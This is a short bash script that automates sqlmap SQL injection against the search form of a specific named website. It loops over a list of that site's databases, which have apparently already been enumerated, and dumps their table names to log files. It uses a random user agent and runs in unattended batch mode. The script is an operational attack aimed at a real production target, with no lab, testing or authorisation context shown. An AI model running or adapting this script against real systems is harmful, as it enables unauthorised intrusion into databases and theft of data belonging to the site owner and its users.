#!/bin/bash

# Target and request details
TARGET_URL="https://www.ptt.co.th/th/search/index.php"
POST_DATA="search_name=d&search_cat=0"

# List of target databases
databases=(
  "information_schema"
  "pttcoth_dileka"
  "pttcoth_help"
  "pttcoth_logocheque"
  "pttcoth_mesati"
  "pttcoth_ptt"
  "pttcoth_quo"
)

# Log folder
LOG_DIR="./sqlmap_logs"
mkdir -p "$LOG_DIR"

# Loop through each database
for db in "${databases[@]}"
do
  echo "[*] Dumping tables for database: $db"
  TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
  LOG_FILE="${LOG_DIR}/${db}_${TIMESTAMP}.log"

  sqlmap -u "$TARGET_URL" \
    --data="$POST_DATA" \
    -D "$db" --tables \
    --batch --random-agent \
    --output-dir="$LOG_DIR/${db}_${TIMESTAMP}" \
    | tee "$LOG_FILE"

  echo "[+] Done with $db. Output logged to $LOG_FILE"
  echo "--------------------------------------------------"
done

echo "[âœ”] All databases processed."

